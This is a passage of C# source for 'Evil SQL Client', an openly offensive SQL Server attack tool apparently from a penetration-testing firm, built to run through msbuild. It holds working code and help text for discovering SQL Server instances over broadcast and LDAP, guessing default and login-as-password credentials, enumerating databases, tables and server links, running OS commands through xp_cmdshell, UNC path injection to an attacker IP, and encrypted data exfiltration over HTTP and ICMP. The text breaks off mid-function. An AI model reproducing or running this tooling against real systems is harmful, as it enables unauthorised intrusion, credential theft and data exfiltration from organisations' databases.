﻿using System;
using System.IO;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Linq;
using System.Collections;
using System.Text;
using System.Xml;
using System.Data;
using System.Collections.Generic;
using System.Data.Sql;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using System.Security.Cryptography;
using System.Net.NetworkInformation;
using System.Net;
using System.DirectoryServices;

namespace evilsqlclient
{
    class Program
    {
        static void Main(string[] args)
        {

            // Setup columns for discovery table
            SQLCommands.MasterDiscoveredList.Columns.Add("Instance");
            SQLCommands.MasterDiscoveredList.Columns.Add("SamAccountName");

            // Setup columns for access table
            SQLCommands.MasterAccessList.Columns.Add("Instance");
            SQLCommands.MasterAccessList.Columns.Add("DomainName");
            SQLCommands.MasterAccessList.Columns.Add("ServiceProcessID");
            SQLCommands.MasterAccessList.Columns.Add("ServiceName");
            SQLCommands.MasterAccessList.Columns.Add("ServiceAccount");
            SQLCommands.MasterAccessList.Columns.Add("AuthenticationMode");
            SQLCommands.MasterAccessList.Columns.Add("ForcedEncryption");
            SQLCommands.MasterAccessList.Columns.Add("Clustered");
            SQLCommands.MasterAccessList.Columns.Add("SQLServerMajorVersion");
            SQLCommands.MasterAccessList.Columns.Add("SQLServerVersionNumber");
            SQLCommands.MasterAccessList.Columns.Add("SQLServerEdition");
            SQLCommands.MasterAccessList.Columns.Add("SQLServerServicePack");
            SQLCommands.MasterAccessList.Columns.Add("OSArchitecture");
            SQLCommands.MasterAccessList.Columns.Add("OsVersionNumber");
            SQLCommands.MasterAccessList.Columns.Add("CurrentLogin");
            SQLCommands.MasterAccessList.Columns.Add("IsSysadmin");
            SQLCommands.MasterAccessList.Columns.Add("CurrentLoginPassword");

            // Run console
            SQLCommands.RunSQLConsole();
        }

        // https://stackoverflow.com/questions/1596530/multi-dimensional-arraylist-or-list-in-c 
        public class MultiDimDictList<K, T> : Dictionary<K, List<T>>
        {
            public void Add(K key, T addObject)
            {
                if (!ContainsKey(key)) Add(key, new List<T>());
                if (!base[key].Contains(addObject)) base[key].Add(addObject);
            }
        }


        public class SQLCommands
        {
            // Setup variables for settings
            public static DataTable MasterDiscoveredList = new DataTable();
            public static DataTable MasterAccessList = new DataTable();
            public static string ConnectionStringG = "";
            public static string InstanceAllG = "disabled";
            public static string InstanceG = "";
            public static string UsernameG = "";
            public static string UsertypeG = "CurrentWindowsUser";
            public static string PasswordG = "";
            public static string ReadyforQueryG = "no";
            public static string ExportFileStateG = "disabled";
            public static string ExportFilePathG = "c:\\windows\\temp\\output.csv";
            public static string HttpStateG = "disabled";
            public static string HttpUrlG = "http://127.0.0.1";
            public static string IcmpStateG = "disabled";
            public static string IcmpIpG = "127.0.0.1";
            public static string EncStateG = "disabled";
            public static string EncKeyG = "AllGoodThings!";
            public static string EncSaltG = "CaptainSalty";
            public static string TimeOutG = "1";
            public static string DiscoveredCountG = "0";
            public static string VerboseG = "disabled";

            // --------------------------------
            // FUNCTION: GetHelp
            // --------------------------------		
            public static string GetHelp()
            {
                string help = @"
    -----------------------------------------------------------------------------------------
     Evil SQL Client (ESC)
     Version: v1.0
     Author: Scott Sutherland (@_nullbind), NetSPI 
     A SQL client with enhanced server discovery, access, and data exfiltration features. :)
     Built for execution as a stand alone assembly, or through an alternative medium for 
     .net code execution such as msbuild and PowerShell. 
    -----------------------------------------------------------------------------------------

    SHOW:
     show settings 			Show connection and exfil settings.
     show discovered 		Show discovered instances. 
     show access  			Show accessible instances, versions, and other information.
     show help 			Show this help page.
 
    CONFIGURE INSTANCE:
     set targetall			Target all accessible SQL Server instances. List with 'show access' command.
     set instance instancename	Target a single instance.  Instance formats supported include: 
 				    server1
 				    server1\instance1
 				    server1,1433
     set connstring stringhere 	Set a custom connection string. Examples below.
				    Server=Server\Instance;Database=Master;Integrated Security=SSPI;Connection Timeout=1
				    Server=Server\Instance;Database=Master;Integrated Security=SSPI;Connection Timeout=1;uid=Domain\Account;pwd=Password;
				    Server=Server\Instance;Database=Master;Connection Timeout=1;User ID=Username;Password=Password
 
    CONFIGURE CREDENTIALS:
     set username username 		User for authenticatiing to SQL Server instances.
 				    Defaults to current Windows user if no username or password is provided.
				    Accepts SQL login, local Windows user, or domain user.  
				    example: sqluser
				    example: localhost\localuser
				    example: domain\domainuser
     set password password		Password for the provided username.  
 				    Defaults to current Windows user if no user or password is provided.
 
    QUERY COMMANDS:
     set timeout 1			Set query timeout. Useful over slow connections.
     query				Arbitrary TSQL query can be executed once a valid connection string is configured.
				    To run against all accessible instances type 'set targetall enabled'.
				    Type the query, then go, and press enter. Multi-line queries are supported.
				    Note: You don't have to type the word 'query'.
				    Example:
				    SELECT @@VERSION
				    GO
 
    DISCOVERY COMMANDS:
     discover broadcast		Discover SQL Server instances via a broadcast request.
     discover domainspn		Discover SQL Server instances via LDAP query to the default DC for MSSQL SPNs.
     discover file filepath		Discover SQL Server instance listed in a file.  One per line.
				    Format examples: 
				    hostname 
				    hostname\instance
				    hostname,port
     show discovered		Display the list of discovered SQL Server instances.
     export discovered outpath	Export the list of discovered SQL Server instances to a file. 
				    Example: export discovered c:\windows\temp\sqlinstances.txt
     clear discovered		Clear list of discovered SQL Server instances.

    INITAL ACCESS COMMANDS:
     check access			Attempts to log into all discovered SQL Server instances.  
 				    Uses current Windows/Domain user by default. 
				    Note: Will use alternative credentials if provided. (set username / set password)
     show access			List SQL Server instances that can be logged into.
     export access outpath		Export list of SQL Server instances that can be logged into to a file.
     clear access			Clear the in memory list of SQL Server instances that can be logged into.			
     check defaultlogins		Attempts to identify SQL Server instances that match known application and attempts the associate usernames and passwords.


    POST EXPLOITATION COMMANDS:
     list serverinfo		List server information for accessoble target SQL Server instances.
     list databases			List databases for accessoble target SQL Server instances.
     list tables			List tables information for accessoble target SQL Server instances.
  				    Limits results to databases the login user has access to.
     list links			List links information for accessoble target SQL Server instances.
     list logins			List logins information for accessoble target SQL Server instances.
     list rolemembers		List rolemember information for accessoble target SQL Server instances.
     list privs			Check accessible target SQL Server instances for logins that use their login as a password.  
     check loginaspw     		Check accessible target SQL Server instances for logins that use their login as a password.                         
     check uncinject IP		Connect to taret SQL Server instance and perform UNC injection back to provide IP.	     
     run OSCMD command		Run os command through xp_cmdshell on the accessible target SQL Server instances. 
 				    *Requires sysadmin privileges.
 
    CONFIGURE DATA EXFILTRATION: 
     set file enabled
     set filepath c:\temp\file.csv
     set icmp tenabled
     set icmpip 127.0.0.1
     set http enabled
     set httpurl http://127.0.0.1
     set encrypt enabled
     set enckey MyKey!
     set encsalt MySalt!

    MISC COMMANDS:
     help
     clear
     exit
 
    RECOMMENDED COMMAND SEQUENCE:
     discover domainspn
     discover broadcast
     show discovered
     set targetall enabled
     show settings
     check access
     check defaultpw
     check loginaspw
     show access
     export discovered c:\temp\discovered.csv
     export access c:\temp\access.csv
 
     Execute queries and commands from there.
     Enable data exfiltraiton settings as needed.

    EXAMPLE SCRIPT EXECUTION 
     Run the msbuild.exe command from its path using one of the commands below. 
     You can explicitly define the .xml or .csproj file to load, but it is not required 
     if only one .csproj file exists your current working directory. 
     C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 
     C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.xml
     C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.csproj
    ";
                Console.WriteLine(help);
                return null;
            }


            // --------------------------------
            // FUNCTION: GetSQLServerFile
            // --------------------------------
            public static string GetSQLServerFile(string filePath)
            {
                // Status
                Console.WriteLine("\nReading file " + filePath + "\n");

                try
                {
                    // Check for path
                    if (string.IsNullOrEmpty(filePath))
                        throw new ArgumentNullException("filePath");

                    // Open file
                    TextReader tr;
                    tr = File.OpenText(filePath);

                    // Read each line										
                    string Instance;
                    Instance = tr.ReadLine();
                    while (Instance != null)
                    {
                        SQLCommands.MasterDiscoveredList.Rows.Add(Instance, "");
                        Console.WriteLine(Instance);
                        Instance = tr.ReadLine();
                    }

                    // Count lines in the files
                    var lines = System.IO.File.ReadAllLines(filePath);
                    var count = lines.Length;
                    Console.WriteLine("\n" + count + " instances found.");
                }
                catch
                {
                    Console.WriteLine(filePath + " file could not be read.");
                }

                Console.Write("\nSQLCLIENT> ");

                return null;
            }


            // --------------------------------
            // FUNCTION: GetSQLServersBroadCast
            // --------------------------------
            public static string GetSQLServersBroadCast()
            {
                Console.WriteLine("\nSending a broadcast request to identify SQL Server instances.\n");
                SqlDataSourceEnumerator instance = SqlDataSourceEnumerator.Instance;
                DataTable table = instance.GetDataSources();
                int bcount = table.Rows.Count;
                if (bcount > 0)
                {
                    Console.WriteLine("Instance");
                }
                foreach (DataRow row in table.Rows)
                {
                    if (row["ServerName"] != DBNull.Value && Environment.MachineName.Equals(row["ServerName"].ToString()))
                    {
                        string Instance = row["ServerName"].ToString();
                        if (row["InstanceName"] != DBNull.Value || !string.IsNullOrEmpty(Convert.ToString(row["InstanceName"]).Trim()))
                        {
                            Instance += @"\" + Convert.ToString(row["InstanceName"]).Trim();
                        }
                        SQLCommands.MasterDiscoveredList.Rows.Add(Instance, "");
                        Console.WriteLine(Instance);
                    }

                    // Display output of data table
                    DataRow[] currentRows = table.Select(null, null, DataViewRowState.CurrentRows);
                }

                if (bcount < 1)
                {
                    Console.WriteLine("No SQL Servers responded to broadcast requests.");
                }
                else
                {
                    Console.WriteLine("\n" + bcount + " SQL Servers responded to broadcast requests.");
                }
                Console.Write("\nSQLCLIENT> ");
                return null;
            }


            // --------------------------------
            // FUNCTION: GetSQLServersSpn
            // --------------------------------
            public static string GetSQLServersSpn()
            {
                // Create data table to store and display output
                DataTable mytable = new DataTable();
                mytable.Clear();
                mytable.Columns.Add("Instance");
                mytable.Columns.Add("SamAccountName");
                // mytable.Columns.Add("servicePrincipalName");

                // Setup LDAP query
                string MyDC = System.Environment.GetEnvironmentVariable("logonserver").Replace("\\\\", "");
                DirectoryEntry RootDirEntry = new DirectoryEntry("LDAP://" + MyDC + ":636", null, null, AuthenticationTypes.SecureSocketsLayer);
                RootDirEntry.AuthenticationType = AuthenticationTypes.Secure;
                Console.WriteLine("\nQuerying " + MyDC + " domain controller for SQL Server SPNs.\n");

                try
                {
                    using (DirectorySearcher ds = new DirectorySearcher(RootDirEntry))
                    {
                        //ds.Filter = "(&(objectClass=user)(objectCategory=person))";
                        ds.Filter = "(servicePrincipalName=*mssql*)";
                        ds.SearchScope = SearchScope.Subtree;
                        ds.PageSize = 1000;
                        using (SearchResultCollection src = ds.FindAll())
                        {
                            foreach (SearchResult sr in src)
                            {
                                try
                                {
                                    foreach (string spn in sr.Properties["servicePrincipalName"])
                                    {

                                        // Grab properties
                                        string SamAccountName = sr.Properties["sAMAccountName"][0].ToString();
                                        int spnindex = spn.IndexOf('/');
                                        string ServiceType = spn.Substring(0, spnindex);
                                        string partialInstance = spn.Substring(spnindex + 1);

                                        // Parse instance
                                        try
                                        {
                                            int instanceindex = partialInstance.IndexOf(':');
                                            string computerName = partialInstance.Substring(0, instanceindex);
                                            string instancePart = partialInstance.Substring(instanceindex + 1);
                                            string instanceName = computerName + "\\" + instancePart;

                                            // Add comma for ports
                                            decimal myDec;
                                            var isNumber = decimal.TryParse(instancePart, out myDec);
                                            if (isNumber)
                                            {
                                                instanceName = instanceName.Replace("\\", ",");
                                            }

                                            // Add record to output table
                                            if (ServiceType.ToLower().Contains("mssql"))
                                            {
                                                mytable.Rows.Add(new object[] { instanceName, SamAccountName });
                                                SQLCommands.MasterDiscoveredList.Rows.Add(instanceName, SamAccountName);
                                            }
                                        }
                                        catch
                                        {
                                        }
                                    }
                                }
                                catch
                                {
                                }
                            }
                        }
                    }

                    // Display output of data table
                    int linewidth = 50;
                    string columnValue = "";
                    string spaces = "";
                    int tabNumber = 1;
                    DataRow[] currentRows = mytable.Select(null, null, DataViewRowState.CurrentRows);
                    if (currentRows.Length < 1)
                    {
                        Console.WriteLine("\nNo rows returned.\n");
                    }
                    else
                    {

                        // Display columns
                        foreach (DataColumn column in mytable.Columns)
                        {
                            // Pad column
                            columnValue = column.ColumnName.ToString();
                            if (columnValue.Length < linewidth)
                            {
                                tabNumber = linewidth - columnValue.Length;
                                spaces = new String(' ', tabNumber);
                            }
                            else
                            {
                                tabNumber = 1;
                            }

                            Console.Write(column.ColumnName + spaces);
                        }

                        Console.WriteLine("\t");

                        // Display rows
                        foreach (DataRow row in currentRows)
                        {
                            foreach (DataColumn column in mytable.Columns)
                            {
                                // Pad column to 50 characters
                                columnValue = row[column].ToString();
                                if (columnValue.Length < linewidth)
                                {
                                    tabNumber = linewidth - columnValue.Length;
                                    spaces = new String(' ', tabNumber);
                                }
                                else
                                {
                                    tabNumber = 1;
                                }

                                Console.Write(row[column] + spaces);
                            }
                            Console.WriteLine("\t");
                        }
                    }

                    Console.WriteLine("\n" + mytable.Rows.Count + " instances found.");
                }
                catch
                {
                    Console.WriteLine("Unable to connect to " + MyDC + ".");
                }
                Console.Write("\nSQLCLIENT> ");
                return null;
            }

            // --------------------------------
            // FUNCTION: EncryptStringAES
            // --------------------------------
            // Set salt - May not want the salt to be static long term :P
            private static byte[] _salt = Encoding.Unicode.GetBytes(EncSaltG);
            public static string EncryptStringAES(string plainText, string sharedSecret)
            {
                if (string.IsNullOrEmpty(plainText))
                    throw new ArgumentNullException("plainText");
                if (string.IsNullOrEmpty(sharedSecret))
                    throw new ArgumentNullException("sharedSecret");

                string outStr = null;                       // Encrypted string to return
                RijndaelManaged aesAlg = null;              // RijndaelManaged object used to encrypt the data.

                try
                {
                    // generate the key from the shared secret and the salt
                    Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);

                    // Create a RijndaelManaged object
                    aesAlg = new RijndaelManaged();
                    aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
                    aesAlg.Mode = CipherMode.ECB;

                    // Create a decryptor to perform the stream transform.
                    ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                    // Create the streams used for encryption.
                    using (MemoryStream msEncrypt = new MemoryStream())
                    {
                        // prepend the IV
                        msEncrypt.Write(BitConverter.GetBytes(aesAlg.IV.Length), 0, sizeof(int));
                        msEncrypt.Write(aesAlg.IV, 0, aesAlg.IV.Length);
                        using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                        {
                            using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                            {
                                //Write all data to the stream.
                                swEncrypt.Write(plainText);
                            }
                        }
                        outStr = Convert.ToBase64String(msEncrypt.ToArray());
                    }
                }
                finally
                {
                    // Clear the RijndaelManaged object.
                    if (aesAlg != null)
                        aesAlg.Clear();
                }

                // Return the encrypted bytes from the memory stream.
                return outStr;
            }

            // --------------------------------
            // FUNCTION: DecryptStringAES
            // --------------------------------
            public static string DecryptStringAES(string cipherText, string sharedSecret)
            {
                if (string.IsNullOrEmpty(cipherText))
                    throw new ArgumentNullException("cipherText");
                if (string.IsNullOrEmpty(sharedSecret))
                    throw new ArgumentNullException("sharedSecret");

                // Declare the RijndaelManaged object
                // used to decrypt the data.
                RijndaelManaged aesAlg = null;

                // Declare the string used to hold
                // the decrypted text.
                string plaintext = null;

                try
                {
                    // generate the key from the shared secret and the salt
                    Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);

                    // Create the streams used for decryption.                
                    byte[] bytes = Convert.FromBase64String(cipherText);
                    using (MemoryStream msDecrypt = new MemoryStream(bytes))
                    {
                        // Create a RijndaelManaged object
                        // with the specified key and IV.
                        aesAlg = new RijndaelManaged();
                        aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
                        aesAlg.Mode = CipherMode.ECB;

                        // Get the initialization vector from the encrypted stream
                        aesAlg.IV = ReadByteArray(msDecrypt);
                        // Create a decrytor to perform the stream transform.
                        ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))

                                // Read the decrypted bytes from the decrypting stream
                                // and place them in a string.
                                plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
                finally
                {
                    // Clear the RijndaelManaged object.
                    if (aesAlg != null)
                        aesAlg.Clear();
                }

                return plaintext;
            }

            // --------------------------------
            // FUNCTION: ReadByteArray
            // --------------------------------
            private static byte[] ReadByteArray(Stream s)
            {
                byte[] rawLength = new byte[sizeof(int)];
                if (s.Read(rawLength, 0, rawLength.Length) != rawLength.Length)
                {
                    throw new SystemException("Stream did not contain properly formatted byte array");
                }

                byte[] buffer = new byte[BitConverter.ToInt32(rawLength, 0)];
                if (s.Read(buffer, 0, buffer.Length) != buffer.Length)
                {
                    throw new SystemException("Did not read byte array properly");
                }

                return buffer;
            }

            // ------------------------------------------------------------
            // FUNCTION: LISTDATABASE
            // ------------------------------------------------------------
            public static string ListDatabase()
            {
                CheckQueryReady();
                if (ReadyforQueryG.Equals("yes"))
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    DataView AccessView = new DataView(SQLCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG.Equals("enabled"))
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int databaseCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    SELECT      @@SERVERNAME  as [ComputerName],
							    @@SERVICENAME as [Instance],
							    a.database_id as [DatabaseId],
							    a.name        as [DatabaseName],
							    SUSER_SNAME(a.owner_sid) as [DatabaseOwner],
							    IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],
							    a.is_trustworthy_on,
							    a.is_db_chaining_on,            
							    a.create_date,
							    a.recovery_model_desc,
							    b.filename as [FileName],
							    (select CASE WHEN SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) > '9' THEN a.is_broker_enabled ELSE 0 END) as isBrokerEnabled,
							    (select CASE WHEN SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) > '9' THEN a.is_encrypted ELSE 0 END) as isEncrypted,
							    (select CASE WHEN SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) > '9' THEN a.is_read_only ELSE 0 END) as isReadonly,
							    (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2))
							    from sys.master_files where name like a.name) as [DbSizeMb],
							    HAS_DBACCESS(a.name) as [has_dbaccess]
							    FROM [sys].[databases] a
							    INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid
							    ORDER BY a.database_id";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nComputer Name     : " + CurrentRecord["ComputerName"].ToString());
                                Console.WriteLine("Instance          : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("DbID              : " + CurrentRecord["DatabaseId"].ToString());
                                Console.WriteLine("DatabaseName      : " + CurrentRecord["DatabaseName"].ToString());
                                Console.WriteLine("Owner             : " + CurrentRecord["DatabaseOwner"].ToString());
                                Console.WriteLine("Owner is sysadmin : " + CurrentRecord["OwnerIsSysadmin"].ToString());
                                Console.WriteLine("CreateDate        : " + CurrentRecord["create_date"].ToString());
                                Console.WriteLine("RecoveryModel     : " + CurrentRecord["recovery_model_desc"].ToString());
                                Console.WriteLine("IsTrustworthy     : " + CurrentRecord["is_trustworthy_on"].ToString());
                                Console.WriteLine("IsDbChaining      : " + CurrentRecord["is_db_chaining_on"].ToString());
                                Console.WriteLine("isBrokerEnabled   : " + CurrentRecord["isBrokerEnabled"].ToString());
                                Console.WriteLine("isEncrypted       : " + CurrentRecord["isEncrypted"].ToString());
                                Console.WriteLine("isReadOnly        : " + CurrentRecord["isReadonly"].ToString());
                                Console.WriteLine("Database Size     : " + CurrentRecord["DbSizeMb"].ToString());

                                // Increase counter
                                databaseCount = databaseCount + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG.Equals("enabled"))
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + databaseCount + " databases found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: LISTTABLE
            // ------------------------------------------------------------
            public static string ListTable()
            {
                CheckQueryReady();
                if (ReadyforQueryG.Equals("yes"))
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    DataView AccessView = new DataView(SQLCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG.Equals("enabled"))
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int tableCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");


                    // Loops through target instances 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");

                        // Get database list
                        Console.WriteLine("GRABBING LIST OF DATABASES");
                        DataTable Databases = new DataTable();
                        try
                        {
                            string ConnectionStringdb = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
                            string DatabaseQuery = "SELECT name FROM master..sysdatabases WHERE HAS_DBACCESS(name) = 1";
                            SqlConnection conndb = new SqlConnection(ConnectionStringdb);
                            SqlCommand DbQueryOutput = new SqlCommand(DatabaseQuery, conndb);
                            conndb.Open();
                            SqlDataAdapter dadb = new SqlDataAdapter(DbQueryOutput);
                            dadb.Fill(Databases);
                            conndb.Close();
                        }
                        catch
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                        }

                        foreach (DataRow CurrentDatabase in Databases.Select())
                        {
                            // Get table list
                            Console.WriteLine("\nGRABBING LIST OF TABLES FOR " + CurrentDatabase["Name"].ToString());
                            try
                            {
                                // Setup connection string
                                string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                                // Execute query									
                                string fullcommand = @"
								    SELECT  @@SERVERNAME as ComputerName,
								    @@SERVICENAME as Instance,
								    TABLE_CATALOG AS DatabaseName,
								    TABLE_SCHEMA AS SchemaName,
								    TABLE_NAME as TableName,
								    TABLE_TYPE as TableType
								    FROM [" + CurrentDatabase["Name"].ToString() + @"].[INFORMATION_SCHEMA].[TABLES]								
								    ORDER BY TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME";

                                SqlConnection conn = new SqlConnection(ConnectionString);
                                SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                                conn.Open();

                                // Read data into data table
                                DataTable dt = new DataTable();
                                SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                                da.Fill(dt);

                                foreach (DataRow CurrentRecord in dt.Select())
                                {

                                    // Display SQL Server information									
                                    Console.WriteLine("\nComputer Name   : " + CurrentRecord["ComputerName"].ToString());
                                    Console.WriteLine("Instance        : " + CurrentRecord["Instance"].ToString());
                                    Console.WriteLine("Database        : " + CurrentRecord["DatabaseName"].ToString());
                                    Console.WriteLine("Schema          : " + CurrentRecord["SchemaName"].ToString());
                                    Console.WriteLine("Table Name      : " + CurrentRecord["TableName"].ToString());
                                    Console.WriteLine("Table Type      : " + CurrentRecord["TableType"].ToString());

                                    // Increase counter
                                    tableCount = tableCount + 1;
                                }
                            }
                            catch (SqlException ex)
                            {
                                Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                                if (VerboseG.Equals("enabled"))
                                {
                                    Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                                }
                            }
                        }
                    }

                    Console.WriteLine("\n" + tableCount + " tables found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: LISTLINKS
            // ------------------------------------------------------------
            public static string ListLinks()
            {
                CheckQueryReady();
                if (ReadyforQueryG.Equals("yes"))
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                    DataView AccessView = new DataView(SQLCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG.Equals("enabled"))
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int linkCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    SELECT      @@SERVERNAME as [ComputerName],
							    @@SERVICENAME as [Instance],
							    a.server_id as [LinkId],
							    a.name AS [LinkName],
							    CASE a.Server_id
							    WHEN 0
							    THEN 'Local'
							    ELSE 'Remote'
							    END AS [DatabaseLinkLocation],
							    a.product as [Product],
							    a.provider as [Provider],
							    a.catalog as [Catalog],
							    'LocalLogin' = CASE b.uses_self_credential
							    WHEN 1 THEN 'Uses Self Credentials'
							    ELSE c.name
							    END,
							    b.remote_name AS [RemoteLoginName],
							    a.is_rpc_out_enabled,
							    a.is_data_access_enabled,
							    a.modify_date
							    FROM [Master].[sys].[Servers] a
							    LEFT JOIN [Master].[sys].[linked_logins] b
							    ON a.server_id = b.server_id
							    LEFT JOIN [Master].[sys].[server_principals] c
							    ON c.principal_id = b.local_principal_id";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nComputer Name     : " + CurrentRecord["ComputerName"].ToString());
                                Console.WriteLine("Instance          : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("Link ID           : " + CurrentRecord["LinkId"].ToString());
                                Console.WriteLine("Link Name         : " + CurrentRecord["LinkName"].ToString());
                                Console.WriteLine("Link Location     : " + CurrentRecord["DatabaseLinkLocation"].ToString());
                                Console.WriteLine("Product           : " + CurrentRecord["Product"].ToString());
                                Console.WriteLine("Provider          : " + CurrentRecord["Provider"].ToString());
                                Console.WriteLine("Catalog           : " + CurrentRecord["Catalog"].ToString());
                                Console.WriteLine("RemoteLoginName   : " + CurrentRecord["RemoteLoginName"].ToString());
                                Console.WriteLine("RPC Out           : " + CurrentRecord["is_rpc_out_enabled"].ToString());
                                Console.WriteLine("Data Access       : " + CurrentRecord["is_data_access_enabled"].ToString());
                                Console.WriteLine("Modify Date       : " + CurrentRecord["modify_date"].ToString());

                                // Increase counter
                                linkCount = linkCount + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG.Equals("enabled"))
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + linkCount + " server links found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: CHECKUNCPATHINJECTION
            // ------------------------------------------------------------
            public static string CheckUncPathInjection(string attackerip)
            {
                CheckQueryReady();
                if (ReadyforQueryG.Equals("yes"))
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                    DataView AccessView = new DataView(SQLCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG.Equals("enabled"))
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
